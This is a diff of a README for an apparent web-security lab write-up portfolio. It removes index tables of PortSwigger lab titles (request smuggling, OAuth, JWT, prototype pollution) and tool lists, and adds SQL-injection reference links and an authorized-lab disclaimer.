-| 02  | HTTP request smuggling, basic TE.CL vulnerability                                            | Practitioner | `[PENDING]` | —        |
-| 03  | HTTP request smuggling, obfuscating the TE header                                            | Expert       | `[PENDING]` | —        |
-| 04  | HTTP request smuggling, confirming a CL.TE vulnerability via differential responses          | Practitioner | `[PENDING]` | —        |
-| 05  | HTTP request smuggling, confirming a TE.CL vulnerability via differential responses          | Practitioner | `[PENDING]` | —        |
-| 06  | Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability | Practitioner | `[PENDING]` | —        |
-| 07  | Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability | Practitioner | `[PENDING]` | —        |
-| 08  | Exploiting HTTP request smuggling to reveal front-end request rewriting                      | Practitioner | `[PENDING]` | —        |
-| 09  | Exploiting HTTP request smuggling to capture other users' requests                           | Practitioner | `[PENDING]` | —        |
-| 10  | Exploiting HTTP request smuggling to deliver reflected XSS                                   | Practitioner | `[PENDING]` | —        |
-| 11  | Response queue poisoning via H2.TE request smuggling                                         | Expert       | `[PENDING]` | —        |
-| 12  | H2.CL request smuggling                                                                      | Expert       | `[PENDING]` | —        |
-| 13  | HTTP/2 request smuggling via CRLF injection                                                  | Expert       | `[PENDING]` | —        |
-| 14  | HTTP/2 request splitting via CRLF injection                                                  | Expert       | `[PENDING]` | —        |
-| 15  | CL.0 request smuggling                                                                       | Practitioner | `[PENDING]` | —        |
-| 16  | Exploiting HTTP request smuggling to perform web cache poisoning                             | Expert       | `[PENDING]` | —        |
-| 17  | Exploiting HTTP request smuggling to perform web cache deception                             | Expert       | `[PENDING]` | —        |
-| 18  | Bypassing access controls via HTTP/2 request tunnelling                                      | Expert       | `[PENDING]` | —        |
-| 19  | Web cache poisoning via HTTP/2 request tunnelling                                            | Expert       | `[PENDING]` | —        |
-| 20  | Client-side desync                                                                           | Expert       | `[PENDING]` | —        |
-| 21  | Browser-powered desync attacks                                                               | Expert       | `[PENDING]` | —        |
-| 22  | Pause-based desync                                                                           | Expert       | `[PENDING]` | —        |
-
----
-
-### 28. OAuth Authentication — 6 Labs
-
-OAuth implementation flaws allow attackers to hijack authorization flows, steal access tokens, force account linking via CSRF, and in some configurations perform SSRF through dynamic client registration.
-
-**OWASP A07:2021** · **CWE-601** · **MITRE ATT&CK T1550**
-
-| #   | Lab Title                                         | Difficulty   | Status      | Write-Up |
-| --- | ------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Authentication bypass via OAuth implicit flow     | Apprentice   | `[PENDING]` | —        |
-| 02  | Forced OAuth profile linking                      | Practitioner | `[PENDING]` | —        |
-| 03  | OAuth account hijacking via redirect_uri          | Practitioner | `[PENDING]` | —        |
-| 04  | Stealing OAuth access tokens via an open redirect | Expert       | `[PENDING]` | —        |
-| 05  | SSRF via OpenID dynamic client registration       | Practitioner | `[PENDING]` | —        |
-| 06  | Stealing OAuth access tokens via a proxy page     | Expert       | `[PENDING]` | —        |
-
----
-
-### 29. JWT Attacks — 8 Labs
-
-JWT attacks exploit weak or absent signature verification, allowing attackers to forge tokens with arbitrary claims, escalate privileges, and bypass authentication by manipulating header parameters or brute-forcing signing secrets.
-
-**OWASP A07:2021** · **CWE-347** · **MITRE ATT&CK T1550.001**
-
-| #   | Lab Title                                                             | Difficulty   | Status      | Write-Up |
-| --- | --------------------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | JWT authentication bypass via unverified signature                    | Apprentice   | `[PENDING]` | —        |
-| 02  | JWT authentication bypass via flawed signature verification           | Apprentice   | `[PENDING]` | —        |
-| 03  | JWT authentication bypass via weak signing secret                     | Practitioner | `[PENDING]` | —        |
-| 04  | JWT authentication bypass via jwk header injection                    | Practitioner | `[PENDING]` | —        |
-| 05  | JWT authentication bypass via jku header injection                    | Practitioner | `[PENDING]` | —        |
-| 06  | JWT authentication bypass via kid header path traversal               | Practitioner | `[PENDING]` | —        |
-| 07  | JWT authentication bypass via algorithm confusion                     | Expert       | `[PENDING]` | —        |
-| 08  | JWT authentication bypass via algorithm confusion without exposed key | Expert       | `[PENDING]` | —        |
-
----
-
-### 30. Prototype Pollution — 10 Labs
-
-Prototype pollution injects properties into JavaScript's Object prototype through unsafe merge or recursive copy operations, enabling client-side XSS, server-side privilege escalation, and remote code execution via polluted gadget chains.
-
-**OWASP A03:2021** · **CWE-1321** · **MITRE ATT&CK T1059.007**
-
-| #   | Lab Title                                                                      | Difficulty   | Status      | Write-Up |
-| --- | ------------------------------------------------------------------------------ | ------------ | ----------- | -------- |
-| 01  | DOM XSS via client-side prototype pollution                                    | Practitioner | `[PENDING]` | —        |
-| 02  | DOM XSS via an alternative prototype pollution vector                          | Practitioner | `[PENDING]` | —        |
-| 03  | Client-side prototype pollution via flawed sanitization                        | Practitioner | `[PENDING]` | —        |
-| 04  | Client-side prototype pollution in third-party libraries                       | Practitioner | `[PENDING]` | —        |
-| 05  | Client-side prototype pollution via browser APIs                               | Practitioner | `[PENDING]` | —        |
-| 06  | Privilege escalation via server-side prototype pollution                       | Practitioner | `[PENDING]` | —        |
-| 07  | Detecting server-side prototype pollution without polluted property reflection | Practitioner | `[PENDING]` | —        |
-| 08  | Bypassing flawed input filters for server-side prototype pollution             | Practitioner | `[PENDING]` | —        |
-| 09  | Remote code execution via server-side prototype pollution                      | Expert       | `[PENDING]` | —        |
-| 10  | Exfiltrating sensitive data via server-side prototype pollution                | Expert       | `[PENDING]` | —        |
-
----
-
-### 31. Essential Skills — 2 Labs
-
-Essential skills labs develop the foundational recon and scanning techniques required to identify and exploit unknown vulnerabilities under timed exam conditions, directly replicating the BSCP exam environment.
-
-| #   | Lab Title                                                  | Difficulty   | Status      | Write-Up |
-| --- | ---------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Discovering vulnerabilities quickly with targeted scanning | Practitioner | `[PENDING]` | —        |
-| 02  | Scanning non-standard data structures                      | Practitioner | `[PENDING]` | —        |
-
----
-
-## Standards and Frameworks
-
-All write-ups reference one or more of the following industry standards for classification, scoring, and remediation guidance.
-
-| Framework                                                                             | Purpose                                              |
-| ------------------------------------------------------------------------------------- | ---------------------------------------------------- |
-| [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/) | Vulnerability classification and testing methodology |
-| [OWASP Top 10 (2021)](https://owasp.org/Top10/)                                       | Risk categorisation                                  |
-| [NIST SP 800-115](https://csrc.nist.gov/publications/detail/sp/800-115/final)         | Technical guide to security testing and assessment   |
-| [PTES](http://www.pentest-standard.org/)                                              | Penetration testing execution standard               |
-| [MITRE ATT&CK](https://attack.mitre.org/)                                             | Adversary tactic and technique mapping               |
-| [CVSS v3.1](https://www.first.org/cvss/v3.1/specification-document)                   | Vulnerability severity scoring                       |
-| [CWE](https://cwe.mitre.org/)                                                         | Weakness enumeration and root cause classification   |
-
----
-
-## Tools and Environment
-
-| Tool                                                                     | Purpose                                                       |
-| ------------------------------------------------------------------------ | ------------------------------------------------------------- |
-| [Burp Suite Community / Pro](https://portswigger.net/burp)               | Primary HTTP interception, scanning, and exploitation proxy   |
-| [PortSwigger Web Security Academy](https://portswigger.net/web-security) | Target lab environment                                        |
-| Firefox / Chromium                                                       | Browser-based payload delivery and response observation       |
-| Python 3                                                                 | Scripted exploitation and payload generation where applicable |
-| SQLMap                                                                   | SQL injection automation and confirmation (selected labs)     |
-| jwt_tool                                                                 | JWT manipulation, cracking, and injection                     |
-| Burp Collaborator / OAST                                                 | Out-of-band interaction detection                             |
-| curl / httpie                                                            | Low-level HTTP request crafting                               |
+## References
+
+| Resource                                                          | URL                                                                                |
+| ----------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
+| OWASP Testing Guide v4.2 — SQL Injection (OTG-INPVAL-005)         | https://owasp.org/www-project-web-security-testing-guide/                          |
+| OWASP A03:2021 — Injection                                        | https://owasp.org/Top10/A03_2021-Injection/                                        |
+| CWE-89 — SQL Injection                                            | https://cwe.mitre.org/data/definitions/89.html                                     |
+| MITRE ATT&CK — T1190 Exploit Public-Facing Application            | https://attack.mitre.org/techniques/T1190/                                         |
+| MITRE ATT&CK — T1552.001 Credentials In Files                     | https://attack.mitre.org/techniques/T1552/001/                                     |
+| CVSS v3.1 Calculator — F-01 Vector                                | https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator                               |
+| PortSwigger Lab — Blind SQL Injection with Conditional Responses  | https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses |
+| SQLMap Documentation                                              | https://sqlmap.org/                                                                |
+| NIST SP 800-115 — Technical Guide to Information Security Testing | https://csrc.nist.gov/publications/detail/sp/800-115/final                         |
 
 ---
 
@@ -857,16 +429,14 @@ All write-ups reference one or more of the following industry standards for clas
 **Michael Asante Anim** | `0x1aerixis`
 BSc Cyber Security — University of Mines and Technology (UMaT), Tarkwa, Ghana
 
-[![GitHub](https://img.shields.io/badge/GitHub-anim--michael--asante-black?style=flat-square&logo=github)](https://github.com/anim-michael-asante)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?style=flat-square&logo=linkedin)](https://linkedin.com/in/michael-asante-anim)
-[![TryHackMe](https://img.shields.io/badge/TryHackMe-0x1aerixis-red?style=flat-square&logo=tryhackme)](https://tryhackme.com/p/0x1aerixis)
-[![X](https://img.shields.io/badge/X-0x1aerixis-black?style=flat-square&logo=x)](https://x.com/0x1aerixis)
-[![Discord](https://img.shields.io/badge/Discord-0x1aerixis-5865F2?style=flat-square&logo=discord)](https://discord.com/users/0x1aerixis)
+[![GitHub](https://img.shields.io/badge/GitHub-anim--michael--asante-black?logo=github)](https://github.com/anim-michael-asante)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?logo=linkedin)](https://linkedin.com/in/michael-asante-anim)
+[![TryHackMe](https://img.shields.io/badge/TryHackMe-0x1aerixis-red?logo=tryhackme)](https://tryhackme.com/p/0x1aerixis)
+[![X](https://img.shields.io/badge/X-0x1aerixis-black?logo=x)](https://x.com/0x1aerixis)
+[![Discord](https://img.shields.io/badge/Discord-0x1aerixis-5865F2?logo=discord)](https://discord.com/users/0x1aerixis)
 
 > _"Built in the lab. Documented for the field."_
 
 ---
 
-> **Disclaimer:** All work documented in this repository was conducted in authorized, isolated
-> lab environments or sanctioned CTF platforms. No unauthorized systems were accessed.
-> This project is intended for educational and portfolio purposes only.
+> **Disclaimer:** All work documented in this repository was conducted in authorized, isolated lab environments or sanctioned CTF platforms. No unauthorized systems were accessed. This project is intended for educational and portfolio purposes only.
